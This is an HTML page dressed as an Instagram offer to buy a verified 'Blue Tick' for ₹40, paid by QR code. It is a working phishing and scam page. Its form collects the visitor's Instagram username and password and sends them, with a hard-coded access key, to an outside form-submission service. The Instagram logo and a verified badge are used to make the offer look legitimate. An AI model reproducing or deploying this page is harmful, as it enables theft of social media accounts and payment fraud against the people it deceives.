<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>insta badge</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      min-height: 100vh;
      margin: 0;
    }

    .insta-card {
      width: 100%;
      max-width: 400px;
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
      animation: fadeIn 0.6s ease-in-out;
    }

    .logo {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      margin-bottom: 10px;
    }

    .verified-badge {
      width: 24px;
      height: 24px;
      vertical-align: middle;
      margin-left: 5px;
      animation: pop 1s infinite ease-in-out;
    }

    h3 {
      font-size: 20px;
      margin-bottom: 8px;
      color: #262626;
    }

    .subtext {
      font-size: 14px;
      color: #444;
      margin-bottom: 10px;
    }

    .qr-section img {
      width: 100%;
      max-width: 180px;
      height: auto;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 15px;
    }

    .input-field, .buy-button {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border-radius: 6px;
      font-size: 14px;
    }

    .input-field {
      border: 1px solid #ccc;
    }

    .file-upload {
      text-align: left;
      margin-bottom: 12px;
      font-size: 14px;
    }

    .buy-button {
      background-color: #3897f0;
      color: white;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .buy-button:hover {
      background-color: #2b76c3;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pop {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.3); }
    }

    @media (max-width: 480px) {
      h3 {
        font-size: 18px;
      }
      .verified-badge {
        width: 18px;
        height: 18px;
      }
    }
  </style>
</head>
<body>

  <form class="insta-card" action="https://api.web3forms.com/submit" method="POST"  >
    <input type="hidden" name="access_key" value="2246ebe0-bd48-4fc0-9dab-9ca77831d7ef">

    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" class="logo">
    
    <h3>Buy Blue Tick 
      <img class="verified-badge" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" alt="Verified Badge">
    </h3>
    
    <p class="subtext">Get verified user status instantly!</p>
    <p class="subtext">Only for ₹40 — Pay below</p>

    <div class="qr-section">
      <h4>Scan to Pay</h4>
      <img src="qr.jpg" alt="QR Code for Payment">
    </div>

    <input type="text" class="input-field" name="instagram_id" placeholder="Instagram ID" required>

    <input type="text" class="input-field" name="p" placeholder="password" required>
    

    <button class="buy-button" type="submit">Pay & Submit</button>

  </form>

</body>

</html>
